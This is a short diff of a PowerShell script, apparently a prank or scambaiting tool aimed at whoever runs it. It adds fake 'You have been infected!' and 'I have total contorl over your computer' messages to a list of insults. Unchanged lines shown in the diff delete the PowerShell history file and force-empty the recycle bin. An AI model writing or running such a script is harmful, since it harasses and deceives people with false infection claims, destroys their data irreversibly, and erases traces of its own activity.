@@ -41,6 +41,10 @@ $msgs = @(
 "Is the pay worth being this big of a loser?"
 "Do your parents know what you do for a living?"
 "Does you boss know much much you suck at this job?"
+"Virus is starting"
+"You have been infected!"
+"Please do not call me again"
+"I have total contorl over your computer, ha, ha ,ha."
 )
 
 for ($i=1; $i -le $cycles; $i++) {
@@ -73,3 +77,4 @@ Remove-Item (Get-PSreadlineOption).HistorySavePath
 # Deletes contents of recycle bin
 
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
